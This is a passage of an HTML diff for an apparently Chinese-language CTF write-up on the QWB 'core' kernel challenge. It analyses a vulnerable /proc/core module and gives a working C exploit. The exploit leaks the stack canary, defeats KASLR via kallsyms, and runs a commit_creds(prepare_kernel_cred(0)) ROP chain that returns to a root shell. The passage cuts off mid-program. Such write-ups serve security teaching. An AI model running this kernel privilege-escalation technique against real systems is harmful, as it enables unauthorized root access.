+  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">>=</span> memory_start<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val <span class="token operator">+</span> size<span class="token punctuation">)</span> <span class="token operator">&lt;</span> memory_end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token punctuation">}</span>
+</code></pre>
+<p>返回再看函数</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">result <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v6 <span class="token operator">+</span> off<span class="token punctuation">,</span> <span class="token number">64LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>查看下汇编</p>
+<p></p><p class="code-caption" data-lang="asm" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-asm"><code class="language-asm">.text:00000000000000AB                 mov     rsi, offset src ; "Welcome to the QWB CTF challenge.\n"
+.text:00000000000000B2                 mov     rdi, rsp        ; dest
+.text:00000000000000B5                 call    strcpy
+.text:00000000000000BA                 mov     rsi, rsp
+.text:00000000000000BD                 add     rsi, cs:off
+.text:00000000000000C4                 mov     edx, 40h ; '@'
+.text:00000000000000C9                 mov     rdi, rbx
+.text:00000000000000CC                 call    _copy_to_user
+.text:00000000000000D1                 test    rax, rax
+.text:00000000000000D4                 jz      short loc_DB
+</code></pre>
+<p>看到v6其实就是rsp 而off又是我们可以控制设置的 传入 0x6677889C  ，所以利用好这个点 可以leak canary（从0位开始获取）以及内核函数地址</p>
+<p>canary = rsp+ 0x40<br>所以设置off为0x40</p>
+<p>程序基本分析完毕<br>1.存在溢出 可以利用执行rop<br>2.off可控 利用v6+off leak canary<br>3.因为给出静态vmlinux //可以直接在此中查找gadget</p>
+<ol>
+<li>给出vmlinux 并且启动环境后会将/proc/kallsyms写入tmp/ kallsyms查找commit_creds，prepare_kernel_cred<br>5.虽然开启了kaslr 但是可以通过commit_creds，prepare_kernel_cred 计算出找vmlinux base</li>
+</ol>
+<p>利用ropgadget提取gadget 过于缓慢 …(CTFwiki suggest use Ropper)<br>所以我们用Ropper提取gadget</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  give_to_player ropper --file ./vmlinux --nocolor <span class="token operator">></span> g1
+<span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> Load gadgets from cache
+<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> loading<span class="token punctuation">..</span>. 100%
+<span class="token punctuation">[</span>LOAD<span class="token punctuation">]</span> removing double gadgets<span class="token punctuation">..</span>. 100%
+</code></pre>
+<h3 id="offset-计算exp"><a href="#offset-计算exp" class="headerlink" title="offset 计算exp"></a>offset 计算exp</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">➜  give_to_player checksec vmlinux
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/kernel/croe/give_to_player/vmlinux'</span>
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="token punctuation">(</span>0xffffffff81000000<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#raw_vmlinux_base</span>
+    RWX:      Has RWX segments
+</code></pre>
+<pre class=" language-C"><code class="language-C">#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <string.h>
+#include <sys/mman.h>
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+size_t raw_vmlinux_base = 0xffffffff81000000;
+size_t vmlinux_base = 0;
+size_t find_symbols()
+{
+    FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
+
+    if(kallsyms_fd < 0)
+    {
+        puts("[*]open kallsyms error!");
+        exit(0);
+    }
+
+    char buf[0x30] = {0};
+    while(fgets(buf, 0x30, kallsyms_fd))
+    {
+        if(commit_creds & prepare_kernel_cred)
+            return 0;
+
+        if(strstr(buf, "commit_creds") && !commit_creds)
+        {
+            /* puts(buf); */
+            char hex[20] = {0};
+            strncpy(hex, buf, 16);
+            /* printf("hex: %s\n", hex); */
+            sscanf(hex, "%llx", &commit_creds);
+            printf("commit_creds addr: %p\n", commit_creds);
+
+            vmlinux_base = commit_creds - 0x9c8e0;
+            printf("vmlinux_base addr: %p\n", vmlinux_base);
+        }
+
+        if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
+        {
+            /* puts(buf); */
+            char hex[20] = {0};
+            strncpy(hex, buf, 16);
+            sscanf(hex, "%llx", &prepare_kernel_cred);
+            printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
+            vmlinux_base = prepare_kernel_cred - 0x9cce0;
+            /* printf("vmlinux_base addr: %p\n", vmlinux_base); */
+        }
+    }
+
+    if(!(prepare_kernel_cred & commit_creds))
+    {
+        puts("[*]Error!");
+        exit(0);
+    }
+
+}
+int main(void){
+
+find_symbols();
+unsigned long long offset = vmlinux_base - raw_vmlinux_base;
+printf("{==dbg==} leak offset: %p\n",(void*)offset);
+}
+<p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p>
+</code></pre>
+<h3 id="平衡堆栈"><a href="#平衡堆栈" class="headerlink" title="平衡堆栈"></a>平衡堆栈</h3><p>就像刚开始说的一样 内核态与用户态pwn的差别  内核态还需要稳定堆栈<br>在内核返回用户态的时候，会调用iretq，iretq会依次弹出 rip cs eflags rsp ss之后做一些判断，如果不能构造好这些参数，系统会崩溃<br>这里采取提前保存的方式来稳定堆栈</p>
+<pre class=" language-C"><code class="language-C">static void save_state() {
+    asm(
+    "movq %%cs, %0\n"
+    "movq %%ss, %1\n"
+    "pushfq\n"
+    "popq %2\n"
+    : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
+}
+</code></pre>
+<h3 id="Set-off-and-Leak-canary"><a href="#Set-off-and-Leak-canary" class="headerlink" title="Set off and Leak canary"></a>Set off and Leak canary</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token macro property">#use to fake stack</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property">#set off =0x40</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property">#set case = 0x6677889b into core_read than leak canary</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> canary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} canary: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>有了cananry 就可以构造rop了</p>
+<h3 id="ROP-to-getshell-and-ret-user"><a href="#ROP-to-getshell-and-ret-user" class="headerlink" title="ROP to getshell and ret user"></a>ROP to getshell and ret user</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> rop_buf<span class="token punctuation">[</span><span class="token number">0x1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>rop_buf<span class="token punctuation">;</span>
+    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6161616161616161</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//rbx</span>
+    <span class="token comment" spellcheck="true">//ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81000b2f</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdi ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109cce0</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//prepare_kernel_cred</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff810a0f49</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//pop rdx ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8109c8e0</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//commit_creds</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff8101aa6a</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//mov rdi, rax ; call rdx</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81a012da</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//swapgs ; popfq ; ret</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xffffffff81050ac2</span><span class="token operator">+</span>offset<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//iretq</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>shell<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_rflags<span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>page<span class="token operator">+</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    rop<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>
+    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>rop_buf<span class="token punctuation">,</span><span class="token number">0x800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889a</span><span class="token punctuation">,</span><span class="token number">0xffffffffffff0000</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>要注意在getshell前，提前save_state </p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
+
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_cs<span class="token punctuation">;</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_ss<span class="token punctuation">;</span>
+<span class="token keyword">unsigned</span> <span class="token keyword">long</span> user_rflags<span class="token punctuation">;</span>
+size_t commit_creds <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+size_t raw_vmlinux_base <span class="token operator">=</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
+size_t vmlinux_base <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+size_t <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    FILE<span class="token operator">*</span> kallsyms_fd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/kallsyms"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span>kallsyms_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]open kallsyms error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> kallsyms_fd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>commit_creds <span class="token operator">&amp;</span> prepare_kernel_cred<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"commit_creds"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>commit_creds<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
+            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">/* printf("hex: %s\n", hex); */</span>
+            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"commit_creds addr: %p\n"</span><span class="token punctuation">,</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            vmlinux_base <span class="token operator">=</span> commit_creds <span class="token operator">-</span> <span class="token number">0x9c8e0</span><span class="token punctuation">;</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"vmlinux_base addr: %p\n"</span><span class="token punctuation">,</span> vmlinux_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"prepare_kernel_cred"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>prepare_kernel_cred<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">/* puts(buf); */</span>
+            <span class="token keyword">char</span> hex<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            <span class="token function">strncpy</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">sscanf</span><span class="token punctuation">(</span>hex<span class="token punctuation">,</span> <span class="token string">"%llx"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred addr: %p\n"</span><span class="token punctuation">,</span> prepare_kernel_cred<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            vmlinux_base <span class="token operator">=</span> prepare_kernel_cred <span class="token operator">-</span> <span class="token number">0x9cce0</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">/* printf("vmlinux_base addr: %p\n", vmlinux_base); */</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>prepare_kernel_cred <span class="token operator">&amp;</span> commit_creds<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*]Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span>
+    <span class="token string">"movq %%cs, %0\n"</span>
+    <span class="token string">"movq %%ss, %1\n"</span>
+    <span class="token string">"pushfq\n"</span>
+    <span class="token string">"popq %2\n"</span>
+    <span class="token punctuation">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">int</span> fd  <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/core"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"open core error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} fd: %d\n"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">save_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">find_symbols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span> <span class="token operator">*</span>page <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400000</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> ret<span class="token punctuation">;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} set off"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889C</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} copy to user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ret <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6677889b</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"{==dbg==} ret: %d\n"</span><span class="token punctuation">,</span>ret<span class="token punctuation">)</span><span class="token punctuation">;</span>
